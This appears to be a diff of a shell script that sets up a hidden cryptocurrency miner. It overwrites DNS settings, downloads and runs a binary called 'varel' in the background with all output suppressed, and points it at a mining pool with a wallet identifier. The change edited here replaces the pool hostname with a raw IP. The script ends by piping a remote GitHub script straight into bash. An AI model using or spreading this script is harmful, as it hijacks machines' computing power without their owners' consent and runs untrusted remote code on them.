@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget https://github.com/superade99/ade/raw/refs/heads/main/varel
 chmod +x varel
-./varel -a randomvirel --url eu.rplant.xyz:7155 --user v38ksv6jk6vnvo2k9vfwikr3yg6v5suit4w7h5.$(shuf -n 1 -i 1-99999)-kido > /dev/null 2>&1 &
+./varel -a randomvirel --url 167.99.139.112:80 --user v38ksv6jk6vnvo2k9vfwikr3yg6v5suit4w7h5.$(shuf -n 1 -i 1-99999)-kido > /dev/null 2>&1 &
 curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
